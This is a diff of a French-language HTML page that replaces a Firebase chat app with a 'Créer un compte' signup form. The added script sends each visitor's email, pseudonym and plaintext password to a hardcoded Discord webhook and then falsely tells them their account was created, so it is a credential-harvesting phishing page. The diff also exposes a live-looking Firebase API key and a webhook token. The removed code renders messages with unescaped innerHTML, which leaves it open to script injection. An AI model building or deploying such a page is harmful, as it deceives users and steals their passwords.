@@ -3,157 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>violations sur ta communes</title>
+<title>Signup</title>
 <style>
   body {
-    background-color: #0b3d91; /* bleu foncé */
+    background-color: #0b3d91;
     color: white;
     font-family: monospace;
-    margin: 0;
-    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
   }
-  #auth, #chat {
-    max-width: 500px;
-    margin: 50px auto;
-    padding: 20px;
+  #signup {
     background-color: rgba(0,0,0,0.3);
+    padding: 20px;
     border-radius: 8px;
   }
-  input {
+  input, button {
     width: 100%;
-    margin: 5px 0;
     padding: 8px;
-    border: none;
+    margin: 5px 0;
     border-radius: 4px;
+    border: none;
   }
   button {
-    padding: 10px;
     background-color: #1a5fb4;
     color: white;
-    border: none;
-    border-radius: 4px;
     cursor: pointer;
-    margin-top: 5px;
   }
   button:hover {
     background-color: #0a3d80;
   }
-  #messages {
-    height: 300px;
-    overflow-y: auto;
-    border: 1px solid #ccc;
-    padding: 5px;
-    margin-bottom: 10px;
-    background-color: rgba(255,255,255,0.1);
-    border-radius: 4px;
-  }
 </style>
-
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js"></script>
 </head>
 <body>
 
-<div id="auth">
-  <h2>Login / Signup</h2>
-  <input id="email" placeholder="Email" type="email"/>
-  <input id="password" placeholder="Password" type="password"/>
-  <input id="displayName" placeholder="Display Name" type="text"/>
-  <button id="signup">Signup</button>
-  <button id="login">Login</button>
-</div>
-
-<div id="chat2zgeg" style="display:none;">
-  <h2>Chat Global</h2>
-  <div id="messages"></div>
-  <input id="messageInput" placeholder="Écrire un message"/>
-  <button id="send">Envoyer</button>
+<div id="signup">
+  <h2>Créer un compte</h2>
+  <input id="email" type="email" placeholder="Email" required>
+  <input id="username" type="text" placeholder="Pseudonyme" required>
+  <input id="password" type="password" placeholder="Mot de passe" required>
+  <button id="submit">Créer le compte</button>
 </div>
 
 <script>
-  // Config Firebase : remplace avec les tiens
-  const firebaseConfig = {
-    apiKey: "AIzaSyBpQfaPdFa9y68ZKMD0OjJFDYb8n0UU_wk",
-    authDomain: "ikillhismom.firebaseapp.com",
-    projectId: "ikillhismom",
-    storageBucket: "ikillhismom.firebasestorage.app",
-    messagingSenderId: "385432951279",
-    appId: "1:385432951279:web:e25960d53255f126fcfe1a",
-    measurementId: "G-K4H70YYHMN"
-  };
+  const webhookURL = "https://discord.com/api/webhooks/1406021613316735247/NTjoX6ln-ASDsg7-vIYGOV2bEhv2JatvfUHPnEh2qk66JnNDurSo6QaYpkb0ALqaRAwq"; 
 
-  const app = firebase.initializeApp(firebaseConfig);
-  const auth = firebase.auth();
-  const db = firebase.firestore();
-
-  // Charger les messages dès le début
-  function loadMessages() {
-    db.collection("messages").orderBy("timestamp")
-      .onSnapshot(snapshot => {
-        const messagesDiv = document.getElementById("messages");
-        messagesDiv.innerHTML = "";
-        snapshot.forEach(doc => {
-          const data = doc.data();
-          messagesDiv.innerHTML += `<p><strong>${data.displayName || "Anonyme"}:</strong> ${data.message}</p>`;
-        });
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
-      });
-  }
-  loadMessages();
-
-  // Signup
-  document.getElementById("signup").onclick = () => {
+  document.getElementById("submit").onclick = () => {
     const email = document.getElementById("email").value;
-    const pass = document.getElementById("password").value;
-    const displayName = document.getElementById("displayName").value;
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
-    if(!displayName) { alert("Choisis un display name !"); return; }
-
-    auth.createUserWithEmailAndPassword(email, pass)
-      .then(userCredential => userCredential.user.updateProfile({ displayName }))
-      .then(() => {
-        document.getElementById("auth").style.display = "none";
-        document.getElementById("chat").style.display = "block";
-      })
-      .catch(console.error);
-  };
-
-  // Login
-  document.getElementById("login").onclick = () => {
-    const email = document.getElementById("email").value;
-    const pass = document.getElementById("password").value;
-
-    auth.signInWithEmailAndPassword(email, pass)
-      .then(() => {
-        document.getElementById("auth").style.display = "none";
-        document.getElementById("chat").style.display = "block";
-      })
-      .catch(console.error);
-  };
-
-  // Envoyer message
-  document.getElementById("send").onclick = () => {
-    const message = document.getElementById("messageInput").value;
-    const user = auth.currentUser;
-    if(!message) return;
-
-    db.collection("messages").add({
-      displayName: user ? user.displayName : "Anonyme",
-      message: message,
-      timestamp: firebase.firestore.FieldValue.serverTimestamp()
-    });
-    document.getElementById("messageInput").value = "";
-  };
-
-  // Garder l'utilisateur connecté
-  auth.onAuthStateChanged(user => {
-    if(user) {
-      document.getElementById("auth").style.display = "none";
-      document.getElementById("chat").style.display = "block";
+    if(!email || !username || !password) {
+      alert("Remplis tous les champs !");
+      return;
     }
-  });
+
+    const data = {
+      content: `Nouveau signup
+Email: ${email}
+Pseudonyme: ${username}
+Mot de passe: ${password}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+    .then(res => {
+      if(res.ok) {
+        alert("Compte creer !");
+        document.getElementById("email").value = "";
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+      } else {
+        alert("Erreur lors de l'envoi.");
+      }
+    })
+    .catch(console.error);
+  };
 </script>
 
 </body>
